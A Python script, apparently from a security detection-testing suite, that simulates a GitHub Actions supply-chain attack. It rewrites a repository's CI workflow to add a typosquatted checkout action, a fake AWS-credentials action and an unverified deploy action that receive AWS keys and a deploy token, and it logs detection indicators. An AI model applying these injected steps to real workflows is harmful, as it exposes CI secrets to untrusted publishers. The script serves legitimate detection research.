#!/usr/bin/env python3
"""Attack Scenario 8.2: Compromised GitHub Action - Supply Chain Attack"""
import sys
import json
import shutil
from pathlib import Path
from datetime import datetime

class CompromisedActionAttack:
    """Uses malicious third-party Action from marketplace (typosquatting, unpinned versions)."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.workflow_file = self.repo_root / ".github" / "workflows" / "ci-pipeline.yml"

    def inject_attack(self):
        """Inject compromised/malicious GitHub Actions."""
        if not self.workflow_file.exists():
            print(f"[!] Workflow file not found: {self.workflow_file}")
            return False

        # Backup original
        backup_file = self.workflow_file.parent / f"ci-pipeline.yml.backup_{self.backup_suffix}"
        shutil.copy2(self.workflow_file, backup_file)

        # Read workflow
        with open(self.workflow_file, 'r') as f:
            content = f.read()

        # Create malicious actions step
        malicious_step = '''
      # RESEARCH ATTACK 8.2: Compromised/Typosquatted GitHub Actions
      - name: Checkout code (TYPO - malicious action)
        uses: actions/chekout@v3  # TYPO! Should be "checkout" - potential malicious action
        # This would be a typosquatted action that mimics the real one

      - name: Setup fake AWS credentials action
        uses: suspicious-org/aws-credentials-setup@v1  # Fake AWS action - not from official aws-actions
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        # Real action is: aws-actions/configure-aws-credentials

      - name: Use unpinned action (security risk)
        uses: third-party/action@main  # Unpinned - could be compromised at any time
        # Should be pinned to commit SHA: third-party/action@abc123...

      - name: Use unverified marketplace action
        uses: random-user/deploy-tool@v1  # Unknown publisher, no verification
        with:
          token: ${{ secrets.DEPLOY_TOKEN }}

      - name: Log attack indicators
        run: |
          echo "ATTACK_INDICATOR: typosquatted_action=actions/chekout"
          echo "ATTACK_INDICATOR: fake_aws_action=suspicious-org/aws-credentials-setup"
          echo "ATTACK_INDICATOR: unpinned_action=third-party/action@main"
          echo "ATTACK_INDICATOR: unverified_publisher=random-user/deploy-tool"
          echo "ATTACK_INDICATOR: supply_chain_risk=high"
'''

        # Find insertion point (after a checkout or setup step)
        if "- uses: actions/checkout@" in content:
            parts = content.split("- uses: actions/checkout@", 1)
            remaining = parts[1]
            # Find next major step
            next_step_idx = remaining.find("\n      - name: Build")
            if next_step_idx != -1:
                content = (parts[0] + "- uses: actions/checkout@" +
                          remaining[:next_step_idx] + malicious_step +
                          remaining[next_step_idx:])

        # Write modified workflow
        with open(self.workflow_file, 'w') as f:
            f.write(content)

        print(f"[OK] Injected compromised actions into {self.workflow_file.name}")
        print(f"[OK] Backup: {backup_file.name}")
        return True

    def log_indicators(self):
        """Log attack behavioral indicators."""
        indicators = {
            "attack_type": "compromised_github_action",
            "scenario_id": "8.2",
            "timestamp": datetime.now().isoformat(),
            "severity": "critical",
            "indicators": {
                "supply_chain_attack": True,
                "typosquatted_actions": True,
                "unpinned_actions": True,
                "unverified_publishers": True,
                "workflow_modified": True,
                "malicious_actions": [
                    {
                        "action": "actions/chekout@v3",
                        "type": "typosquatting",
                        "legitimate": "actions/checkout@v3"
                    },
                    {
                        "action": "suspicious-org/aws-credentials-setup@v1",
                        "type": "fake_official_action",
                        "legitimate": "aws-actions/configure-aws-credentials@v1"
                    },
                    {
                        "action": "third-party/action@main",
                        "type": "unpinned_branch",
                        "risk": "mutable_reference"
                    },
                    {
                        "action": "random-user/deploy-tool@v1",
                        "type": "unverified_publisher",
                        "risk": "unknown_source"
                    }
                ]
            },
            "expected_detection": {
                "difficulty": "medium",
                "primary_signals": [
                    "typosquatted_action_name",
                    "unpinned_action_version",
                    "unverified_publisher",
                    "action_marketplace_verification_missing",
                    "workflow_modification"
                ],
                "detection_tools": [
                    "GitHub Action Verification",
                    "Dependabot",
                    "Snyk",
                    "Action Linting Tools",
                    "Supply Chain Security Scanners"
                ]
            },
            "mitre_attack": {
                "technique": "T1195.001",
                "name": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
                "tactic": "Initial Access"
            },
            "real_world_frequency": "high",
            "impact": {
                "credential_theft": "high",
                "code_execution": "high",
                "supply_chain_compromise": "critical"
            }
        }

        # Save indicators
        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        with open(log_dir / f"compromised_action_{self.backup_suffix}.json", 'w') as f:
            json.dump(indicators, f, indent=2)

        return indicators

    def execute(self):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 8.2: Compromised GitHub Action")
        print("=" * 80)
        print("Severity: CRITICAL")
        print("Realism: 9/10 - Real supply chain vector")
        print("Impact: Supply chain compromise, credential theft")
        print()

        if self.inject_attack():
            self.log_indicators()
            print()
            print("[OK] Attack successfully injected!")
            print("[OK] Typosquatted and compromised actions added to workflow")
            print("[!] Detection: Action verification, Dependabot, Snyk")
            print("=" * 80)
            return True
        else:
            print("[FAIL] Attack injection failed")
            return False

if __name__ == "__main__":
    sys.exit(0 if CompromisedActionAttack().execute() else 1)
